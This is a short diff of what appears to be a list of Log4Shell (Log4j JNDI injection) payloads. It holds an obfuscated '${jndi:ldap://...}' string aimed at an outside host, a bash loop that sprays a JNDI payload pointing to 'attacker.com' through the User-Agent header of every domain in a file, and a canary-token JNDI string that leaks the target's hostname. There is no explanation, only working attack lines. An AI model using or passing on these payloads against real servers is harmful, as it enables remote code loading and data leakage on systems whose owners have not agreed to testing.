@@ -2,3 +2,6 @@ ${j${k8s:k5:-ND}i${sd:k5:-:}ldap://mydogsbutt.com:1389/o}
 
 
 cat alldomain.txt | while read url; do log4=$(curl -s -L $url -H User-Agent:"$\{jndi:ldap://attacker.com}");echo -e "$url -> User-Agent: Fired";done
+
+
+canary token ${jndi:ldap://x${hostName}.L4J.avq5a8v80j7cfz27bnfqks7fo.canarytokens.com/a}
